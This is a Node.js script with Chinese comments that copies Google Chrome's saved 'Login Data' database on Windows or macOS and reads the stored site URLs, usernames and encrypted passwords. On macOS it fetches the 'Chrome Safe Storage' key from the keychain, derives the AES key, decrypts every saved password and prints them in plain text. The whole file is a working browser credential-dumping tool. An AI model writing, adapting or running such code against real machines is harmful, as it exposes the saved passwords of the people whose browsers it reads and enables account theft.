var sqlite3 = require("sqlite3").verbose();
var python  = require("python-shell");
var shelljs = require("shelljs");
var fs = require("fs");
var os = require("os");
var path = require("path");
var crypto = require("crypto");
var fileLogin = null;
var userLoginInfo = [];

if ( os.platform() == "win32" ) {
    fileLogin = path.join(process.env.HOME, "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
}

if ( os.platform() == "darwin" ) {
    fileLogin = path.join(process.env.HOME, "/Library/Application Support/Google/Chrome/Default/Login Data");
}

/// 生成临时文件。
if ( !fs.existsSync("./tmp") ) {
    fs.mkdirSync("./tmp");
}

fs.writeFileSync("./tmp/Login Data", fs.readFileSync(fileLogin));

/// 获取 logins 中的数据。
function takeUserInfo() {
    var database = new sqlite3.Database("./tmp/Login Data", sqlite3.OPEN_READONLY);

    database.all("SELECT origin_url,action_url,username_value,password_value FROM logins", function( error, data ) {
        if ( error || !data || !data.length ) {
            return;
        }
        
        for ( var i = 0; i < data.length; ++i ) {
            userLoginInfo.push({ origin_url: data[i].origin_url, action_url: data[i].action_url, username_value: data[i].username_value, password_value: data[i].password_value }); 
        }
        
        decryptLoginInfo();
    });

    database.close();
}

/// 解密用户账号和密码。
function decryptLoginInfo() {
    if ( os.platform() == "darwin" ) {
        var salt = new Buffer("saltysalt", "ascii");
        var iv = new Buffer(" ".repeat(16), "ascii");
        var iterations = 1003;
        var length = 16;
        var keychain = new Buffer(shelljs.exec('security find-generic-password -w -s "Chrome Safe Storage"', { silent: true }).stdout.trim());
        var password = crypto.pbkdf2Sync(keychain, salt, iterations, length);
        
        for ( var k = 0; k < userLoginInfo.length; ++k ) {
            var info = userLoginInfo[k];
            var ipwd = info.password_value.slice(3);
            var cipher = crypto.createDecipheriv("aes-128-cbc", password, iv);
            var decrypted  = cipher.update(ipwd);
                decrypted += cipher.final();
                
            info.password_value = decrypted;
        }
        
        setTimeout(lsPrint, 2000);
    }
}

/// 打印账号密码信息。
function lsPrint() {
    for ( var i = 0; i < userLoginInfo.length; ++i ) {
        console.log("Origin:", userLoginInfo[i].origin_url);
        console.log("Action:", userLoginInfo[i].action_url);
        console.log("Username:", userLoginInfo[i].username_value);
        console.log("Password:", userLoginInfo[i].password_value, "\n");
    }
}

/// Exec;
takeUserInfo();